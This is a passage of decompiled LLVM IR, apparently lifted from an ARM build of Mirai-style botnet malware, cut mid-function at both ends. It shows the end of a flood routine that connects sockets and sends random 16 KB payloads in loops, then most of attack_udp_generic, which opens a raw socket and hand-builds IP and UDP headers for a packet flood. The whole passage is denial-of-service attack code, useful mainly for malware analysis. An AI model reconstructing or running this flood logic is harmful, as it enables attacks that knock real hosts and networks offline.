  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 65535, i32* @r4, align 4
  %v2_b79c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v2_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7f4 = and i32 %v0_b7e8, 65280
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v5_b800 = call i32 @llvm.bswap.i32(i32 %v0_b7e8)
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  %v2_b888 = inttoptr i32 %v7_b880 to i16*
  %v3_b888 = call i32 @rand_str(i16* %v2_b888, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 2, 3, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v6_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v7_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v6_b900, i32 3, i32 65535, i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v7_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b95c = inttoptr i32 %v0_b950 to i32*
  %v6_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b95c, i32 6, i32 65535, i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v5_b978 = inttoptr i32 %v0_b964 to i32*
  %v6_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v5_b978, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v7_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v7_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  %v0_bb28 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb28 = mul i32 %v0_bb28, 32
  store i32 %v3_bb28, i32* %r2.global-to-local, align 4
  store i8 %v1_bb20, i8* %v1_bb18, align 1
  %v0_bb30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb30 = add i32 %v0_bb30, 1
  store i32 %v1_bb30, i32* @r4, align 4
  %v0_bb34 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_bb30, -8
  %v5_bb34 = add i32 %v0_bb34, %tmp61
  store i32 %v5_bb34, i32* %r2.global-to-local, align 4
  store i32 %v6_b8dc, i32* %r1.global-to-local, align 4
  %v2_bb3c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb3c = add i32 %v2_bb3c, 1
  %v4_bb3c = inttoptr i32 %v3_bb3c to i8*
  store i8 %v5_b8fc, i8* %v4_bb3c, align 1
  store i32 %v1_b920, i32* %r3.global-to-local, align 4
  %v0_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb44 = icmp eq i32 %v0_bb44, 0
  store i1 %v2_bb44, i1* %cpsr_z.global-to-local, align 1
  %v2_bb48 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 8
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb4c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_bae8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb50 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb50 = add i32 %v3_bb50, 6
  %v5_bb50 = inttoptr i32 %v4_bb50 to i16*
  store i16 64, i16* %v5_bb50, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_bae8, %bb60
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb5c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb5c = add i32 %v2_bb5c, 9
  %v4_bb5c = inttoptr i32 %v3_bb5c to i8*
  store i8 17, i8* %v4_bb5c, align 1
  %v0_bb60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb60 = trunc i32 %v0_bb60 to i16
  %v2_bb60 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb60 = add i32 %v2_bb60, 2
  %v4_bb60 = inttoptr i32 %v3_bb60 to i16*
  store i16 %v1_bb60, i16* %v4_bb60, align 2
  store i32 %v6_b9cc, i32* %ip.global-to-local, align 4
  %v1_bb68 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb68 = add i32 %v1_bb68, 12
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v6_b9cc, i32* %v3_bb68, align 4
  %v0_bb6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb6c = load i32, i32* @r8, align 4
  %v2_bb6c = add i32 %v1_bb6c, %v0_bb6c
  store i32 %v2_bb6c, i32* %r2.global-to-local, align 4
  %v1_bb70 = add i32 %v2_bb6c, 16
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  store i32 %v3_bb70, i32* %r3.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r5, align 4
  %v1_bb74 = trunc i32 %v0_bb74 to i16
  %v2_bb74 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb74 = add i32 %v2_bb74, 4
  %v4_bb74 = inttoptr i32 %v3_bb74 to i16*
  store i16 %v1_bb74, i16* %v4_bb74, align 2
  %v0_bb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb78 = add i32 %v0_bb78, 20
  store i32 %v1_bb78, i32* %r1.global-to-local, align 4
  %v0_bb7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb7c = add i32 %v0_bb78, 16
  %v3_bb7c = inttoptr i32 %v2_bb7c to i32*
  store i32 %v0_bb7c, i32* %v3_bb7c, align 4
  %v0_bb80 = load i32, i32* @r6, align 4
  %v1_bb80 = trunc i32 %v0_bb80 to i16
  %v2_bb80 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb80 = add i32 %v2_bb80, 20
  %v4_bb80 = inttoptr i32 %v3_bb80 to i16*
  store i16 %v1_bb80, i16* %v4_bb80, align 2
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  store i32 %v7_bb88, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v1_bb8c = load i32, i32* @r7, align 4
  %v9_bb8c = icmp eq i32 %v0_bb8c, %v1_bb8c
  store i1 %v9_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb90 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb90 = add i32 %v2_bb90, 4
  %v4_bb90 = inttoptr i32 %v3_bb90 to i16*
  store i16 %rev, i16* %v4_bb90, align 2
  %v0_bb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb94 = trunc i32 %v0_bb94 to i16
  %v2_bb94 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb94 = add i32 %v2_bb94, 2
  %v4_bb94 = inttoptr i32 %v3_bb94 to i16*
  store i16 %v1_bb94, i16* %v4_bb94, align 2
  %v0_bb98 = load i32, i32* @r4, align 4
  store i32 %v0_bb98, i32* %stack_var_-44, align 4
